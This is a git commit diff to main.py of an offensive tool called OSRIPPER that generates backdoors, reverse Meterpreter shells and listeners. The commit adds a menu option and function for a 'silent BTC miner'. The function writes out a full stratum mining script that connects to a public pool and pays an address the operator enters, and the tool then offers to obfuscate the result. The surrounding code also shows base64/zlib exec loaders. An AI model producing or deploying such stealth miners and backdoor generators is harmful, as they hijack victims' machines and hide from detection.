071d1e80ad3b0c72eb98998bd786dab9e7b1e8e3
hades921 <99681487+SubGlitch1@users.noreply.github.com>
2022-03-25 14:19:17 +0000

    Crypto Update
    Added the first crypto miner

--- main.py
+++ main.py
@@ -50,7 +50,7 @@ logo = """
 ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
 ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
 ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
-                                                                           OSRIPPER v0.2.1
+BETA                                                                       OSRIPPER v0.2.2
 """
 
 clear = lambda: os.system('clear')
@@ -267,8 +267,103 @@ exec(zlib.decompress(base64.b64decode(d)),{'s':s})
                 bindfile.close
 
         print('(*) Generated Backdoor and saved as '+name)
+def gen_btc_miner():
+    global name
+    global host
+    name = 'ocr'
+    addy = input('Please enter the payout btc address: ')
+    with open(name, 'a+') as ina:
+        ina.write('addy = "'+addy+'"\n')
+        b = r'''
+
+import socket
+import json
+import hashlib
+import binascii
+from pprint import pprint
+import time
+import random
+def main():
+    address = addy
+    nonce   = hex(random.randint(0,2**32-1))[2:].zfill(8)
+
+    host    = 'solo.ckpool.org'
+    port    = 3333
+
+    #print("address:{} nonce:{}".format(address,nonce))
+    #print("host:{} port:{}".format(host,port))
+
+    sock    = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect((host,port))
+
+    #server connection
+    sock.sendall(b'{"id": 1, "method": "mining.subscribe", "params": []}\n')
+    lines = sock.recv(1024).decode().split('\n')
+    response = json.loads(lines[0])
+    sub_details,extranonce1,extranonce2_size = response['result']
+
+    #authorize workers
+    sock.sendall(b'{"params": ["'+address.encode()+b'", "password"], "id": 2, "method": "mining.authorize"}\n')
+
+    #we read until 'mining.notify' is reached
+    response = b''
+    while response.count(b'\n') < 4 and not(b'mining.notify' in response):
+        response += sock.recv(1024)
+
+
+    #get rid of empty lines
+    responses = [json.loads(res) for res in response.decode().split('\n') if len(res.strip())>0 and 'mining.notify' in res]
+    #pprint(responses)
+
+    job_id,prevhash,coinb1,coinb2,merkle_branch,version,nbits,ntime,clean_jobs \
+        = responses[0]['params']
+
+    #target https://bitcoin.stackexchange.com/a/36228/44319
+    target = (nbits[2:]+'00'*(int(nbits[:2],16) - 3)).zfill(64)
+    #print('nbits:{} target:{}\n'.format(nbits,target))
+
+    extranonce2 = '00'*extranonce2_size
+
+    coinbase = coinb1 + extranonce1 + extranonce2 + coinb2
+    coinbase_hash_bin = hashlib.sha256(hashlib.sha256(binascii.unhexlify(coinbase)).digest()).digest()
+
+    #print('coinbase:\n{}\n\ncoinbase hash:{}\n'.format(coinbase,binascii.hexlify(coinbase_hash_bin)))
+    merkle_root = coinbase_hash_bin
+    for h in merkle_branch:
+        merkle_root = hashlib.sha256(hashlib.sha256(merkle_root + binascii.unhexlify(h)).digest()).digest()
+
+    merkle_root = binascii.hexlify(merkle_root).decode()
+
+    #little endian
+    merkle_root = ''.join([merkle_root[i]+merkle_root[i+1] for i in range(0,len(merkle_root),2)][::-1])
+
+    #print('merkle_root:{}\n'.format(merkle_root))
+
+    blockheader = version + prevhash + merkle_root + nbits + ntime + nonce +\
+        '000000800000000000000000000000000000000000000000000000000000000000000000000000000000000080020000'
+
+    #print('blockheader:\n{}\n'.format(blockheader))
+
+    hash = hashlib.sha256(hashlib.sha256(binascii.unhexlify(blockheader)).digest()).digest()
+    hash = binascii.hexlify(hash).decode()
+    #print('hash: {}'.format(hash))
+
+    if hash < target :
+        #print('success!!')
+        payload = '{"params": ["'+address+'", "'+job_id+'", "'+extranonce2 \
+            +'", "'+ntime+'", "'+nonce+'"], "id": 1, "method": "mining.submit"}\n'
+        sock.sendall(payload)
+        #print(sock.recv(1024))
+    else:
+        main()
+
+    sock.close()
+main()
+
+'''
+        ina.write(b)
 def postgen():
-    opt_obf = input('Do you want to obfuscate the rat (recommended) (y/n): ')
+    opt_obf = input('Do you want to obfuscate the generated programm (recommended) (y/n): ')
     if opt_obf == 'y':
         encrypted = True
         import obfuscator
@@ -438,6 +533,9 @@ print("""
         3. Create Reverse Meterpreter (HTTP) (Connects back to you)
         4. Create Encrypted TCP Meterpreter (can embed in other script) (SSL) connects back to you
         5. Open a listener
+        ##########################################################################################
+                                                Miners
+        6. Create a silent BTC miner
         
 
 """)  
@@ -482,5 +580,9 @@ if nscan == '5':
     #    disable_defender = True
     port = int(input('Please enter the port u want to listen on: '))
     listen('0.0.0.0', port)
+if nscan == '6':
+    gen_btc_miner()
+    postgen()
+    cleanup()
 else:
     print('Please select a vaild option')
